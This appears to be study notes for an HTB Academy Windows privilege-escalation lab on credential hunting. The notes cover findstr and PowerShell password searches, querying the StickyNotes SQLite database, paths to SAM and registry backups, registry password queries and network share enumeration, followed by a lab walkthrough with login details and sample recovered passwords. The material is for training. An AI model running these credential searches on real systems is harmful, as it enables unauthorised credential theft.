# Other Files - Advanced Credential Hunting

## 🎯 Overview

**Advanced file system searching** reveals credentials in unexpected locations beyond standard configuration files. This includes **StickyNotes databases**, **network share drives**, **system backup files**, and various **application-specific storage locations**. Manual search techniques complement automated enumeration tools.

## 🔍 Manual File System Searches

### Basic String Searches
```cmd
# Search file contents for password strings
cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

# Search with case-insensitive pattern
findstr /si password *.xml *.ini *.txt *.config

# Search with line numbers and file paths
findstr /spin "password" *.*

# Example output:
stuff.txt:1:password: l#-x9r11_2_GL!
```

### PowerShell Search Methods
```powershell
# PowerShell string search
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

# Recursive file extension search
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### File Extension Discovery
```cmd
# Search for specific file extensions
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

# Find config files system-wide
where /R C:\ *.config

# Common high-value extensions:
*.kdbx, *.vmdk, *.vdhx, *.ppk, *.rdp, *.vnc, *.cred, *.config
```

## 📝 Sticky Notes Database

### StickyNotes File Location
```cmd
# StickyNotes SQLite database location:
C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

# Associated files:
plum.sqlite         # Main database
plum.sqlite-shm     # Shared memory file
plum.sqlite-wal     # Write-ahead log
```

### PowerShell SQLite Query
```powershell
# Import PSSQLite module and query database
Set-ExecutionPolicy Bypass -Scope Process
cd .\PSSQLite\
Import-Module .\PSSQLite.psd1

# Set database path
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

# Query Notes table
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# Example output:
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
```

### Alternative Analysis Methods
```bash
# Copy SQLite files to attack box and use strings
strings plum.sqlite-wal | grep -i password
strings plum.sqlite | grep -i root

# Use DB Browser for SQLite
# Query: SELECT Text FROM Note;
```

## 📂 System and Application Files

### Windows System Files
```cmd
# High-value system file locations:
%SYSTEMDRIVE%\pagefile.sys                    # Virtual memory file
%WINDIR%\debug\NetSetup.log                   # Network setup logs
%WINDIR%\repair\sam                           # SAM backup
%WINDIR%\repair\system                        # System registry backup
%WINDIR%\repair\software                      # Software registry backup
%WINDIR%\repair\security                      # Security registry backup
%WINDIR%\iis6.log                            # IIS 6 logs
%WINDIR%\system32\config\AppEvent.Evt        # Application event log
%WINDIR%\system32\config\SecEvent.Evt        # Security event log
%WINDIR%\system32\config\*.sav               # Registry backup files
%WINDIR%\system32\CCM\logs\*.log             # SCCM logs
%WINDIR%\System32\drivers\etc\hosts          # Host file
```

### User Profile Files
```cmd
# User-specific credential storage:
%USERPROFILE%\ntuser.dat                      # User registry hive
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat  # IE cache
C:\ProgramData\Configs\*                      # Application configs
C:\Program Files\Windows PowerShell\*         # PowerShell modules/configs
```

## 🎯 HTB Academy Lab Solution

### Lab Environment
- **Target**: `10.129.223.93` (ACADEMY-WINLPE-WS01)
- **Credentials**: `htb-student:HTB_@cademy_stdnt!`
- **Objective**: Find cleartext password for bob_adm user
- **Access Method**: xfreerdp
- **Primary Method**: StickyNotes SQLite database analysis

### Detailed Walkthrough

#### 1. Connect via RDP
```bash
# Connect to target using xfreerdp
xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt!

# Expected output:
[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
```

#### 2. Navigate to PSSQLite Tools Directory
```powershell
# Open PowerShell and navigate to tools
cd C:\Tools\PSSQLite\
```

#### 3. Set PowerShell Execution Policy
```powershell
# Bypass execution policy for current process
Set-ExecutionPolicy Bypass -scope Process

# Expected output:
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A

# Response: A (Yes to All)
```

#### 4. Import PSSQLite Module
```powershell
# Import the PSSQLite module
Import-Module .\PSSQLite.psd1

# Expected security warning:
Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning message. Do you want to run C:\Tools\PSSQLite\PSSQLite.psm1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R

# Response: R (Run once)
```

#### 5. Query StickyNotes Database
```powershell
# Set database path
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'

# Query the Notes table
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

# Expected output:
Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
\id=e30f6663-29fa-465e-895c-b031e061a26a Network
\id=c73f29c3-64f8-4cfc-9421-f65c34b4c00e [bob_adm password should be here]
```

#### 6. Extract bob_adm Password
```powershell
# Look for bob_adm credentials in the query results
# Password should be visible in one of the Note entries
# Submit the found password as the answer
```

## 🌐 Network Share Drive Hunting

### Share Enumeration
```cmd
# Common network share credential hunting:
net view \\<server>
dir \\<server>\users\*
dir \\<server>\shared\*

# Tools for automated share hunting:
Snaffler.exe -s <domain-controller> -d <domain>
```

### High-Value Share Locations
```cmd
# Common share paths with credentials:
\\<server>\users\<username>\                  # Personal folders
\\<server>\shared\IT\                         # IT department files
\\<server>\applications\configs\              # Application configurations
\\<server>\backup\                            # Backup files
\\<server>\temp\                              # Temporary files
```

## 🛠️ Advanced Search Techniques

### Recursive Pattern Matching
```powershell
# Advanced PowerShell search
Get-ChildItem -Path C:\ -Recurse -File -ErrorAction SilentlyContinue | 
ForEach-Object { 
    Select-String -Path $_.FullName -Pattern "password|credential|admin" -ErrorAction SilentlyContinue 
} | Select-Object Filename, LineNumber, Line

# Search for specific user accounts
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.xml,*.ini,*.config -ErrorAction SilentlyContinue | 
Select-String -Pattern "bob_adm|administrator|admin" -ErrorAction SilentlyContinue
```

### Binary and Database Files
```cmd
# Extract strings from binary files
strings.exe <binary_file> | findstr /i password

# Search registry for stored credentials
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Bulk file access patterns
- SQLite database queries on StickyNotes files
- Registry searches for credential patterns
- Network share enumeration activities
- Access to system backup files
```

### Defensive Measures
```cmd
# Security practices:
- Regular cleanup of backup files
- Secure storage of SQLite databases
- Monitor access to sensitive file locations
- Implement file integrity monitoring
- User education on secure password storage
- Network share permission reviews
```

## 💡 Key Takeaways

1. **StickyNotes databases** often contain plaintext credentials
2. **System backup files** may contain registry copies with credentials
3. **Network shares** frequently store sensitive documents
4. **Manual searching** complements automated enumeration tools
5. **Multiple file types** should be examined systematically
6. **PowerShell provides powerful** search capabilities for credential hunting

---

*Advanced file system credential hunting extends beyond standard configuration files to reveal credentials in unexpected locations throughout Windows systems.* 